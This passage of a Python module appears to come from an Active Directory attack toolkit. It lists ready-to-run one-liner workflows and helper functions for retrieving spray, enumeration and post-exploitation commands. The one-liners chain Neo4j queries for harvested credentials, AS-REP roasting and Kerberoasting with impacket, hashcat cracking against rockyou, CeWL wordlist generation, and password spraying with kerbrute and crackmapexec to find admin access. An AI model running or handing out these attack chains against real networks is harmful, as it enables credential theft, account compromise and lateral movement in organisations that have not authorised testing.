        "cmd": 'echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH \'NT AUTHORITY\' RETURN u.samaccountname" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> targets.txt "$p"; sleep 1800; done',
    },
    {
        "name": "Neo4j Spray + Admin Check (CME)",
        "description": "Export from Neo4j, spray with CME to identify admin access (Pwn3d!)",
        "cmd": 'echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | sort -u > spray_passwords.txt && crackmapexec smb <DC_IP> -u targets.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce',
    },
    {
        "name": "AS-REP Roast → Crack → Spray",
        "description": "Roast AS-REP users, crack hashes, spray cracked passwords",
        "cmd": "impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.txt <DOMAIN>/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce",
    },
    {
        "name": "Kerberoast → Crack → Spray",
        "description": "Kerberoast SPNs, crack TGS hashes, spray cracked passwords",
        "cmd": "impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile kerberoast.txt '<DOMAIN>/<USERNAME>:<PASSWORD>' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce",
    },
    {
        "name": "CeWL → Mutate → Spray",
        "description": "Generate wordlist from website, apply mutations, spray",
        "cmd": "cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt spray_passwords.txt",
    },
]


def get_spray_technique(method: str) -> Optional[SprayTechniqueInfo]:
    """Get spray technique info by method name."""
    return SPRAY_TECHNIQUES.get(method)


def get_all_spray_techniques() -> Dict[str, SprayTechniqueInfo]:
    """Get all spray techniques."""
    return SPRAY_TECHNIQUES


def get_spray_scenarios() -> List[Dict[str, Any]]:
    """Get spray scenario recommendations."""
    return SPRAY_SCENARIOS


def get_user_enum_commands(platform: str = "linux") -> Dict[str, Dict[str, str]]:
    """Get user enumeration commands for a platform."""
    return USER_ENUM_COMMANDS.get(platform, {})


def get_password_list_commands(platform: str = "linux") -> Dict[str, Dict[str, str]]:
    """Get password list generation commands for a platform."""
    return PASSWORD_LIST_COMMANDS.get(platform, {})


def get_password_list_scenarios() -> List[Dict[str, str]]:
    """Get password list generation scenario recommendations."""
    return PASSWORD_LIST_SCENARIOS


def get_spray_oneliners() -> List[Dict[str, str]]:
    """Get spray one-liner commands for complete attack workflows."""
    return SPRAY_ONELINERS


def get_post_exploit_commands(privilege_level: str, category: Optional[str] = None) -> List[tuple]:
    """
    Get post-exploitation commands for a given privilege level.

    Args:
        privilege_level: local-admin, domain-admin, or user-level
        category: Optional category filter (immediate, credential_harvest, etc.)

    Returns:
        List of command tuples (id, description, command, [priority])
    """
    level_commands = POST_EXPLOITATION_COMMANDS.get(privilege_level, {})
    if category:
        return level_commands.get(category, [])
    # Return all commands for this level
    all_commands = []
    for cat_commands in level_commands.values():
        all_commands.extend(cat_commands)
    return all_commands


def get_harvest_tips(command_key: str) -> Dict[str, List[str]]:
    """
    Get educational tips for a credential harvest command.

    Args:
        command_key: The mimikatz module (e.g., sekurlsa::logonpasswords)

    Returns:
        Dict with 'what_to_look_for' and 'next_steps' lists
    """
    return HARVEST_TIPS.get(command_key, {"what_to_look_for": [], "next_steps": []})


def get_arg_acquisition(placeholder: str) -> Dict[str, Any]:
    """
    Get acquisition hints for a command placeholder.

    Args:
        placeholder: The placeholder (e.g., <SID>, <KRBTGT_HASH>)

    Returns:
        Dict with description, quick_commands, example, etc.
    """
    return ARG_ACQUISITION.get(placeholder, {})
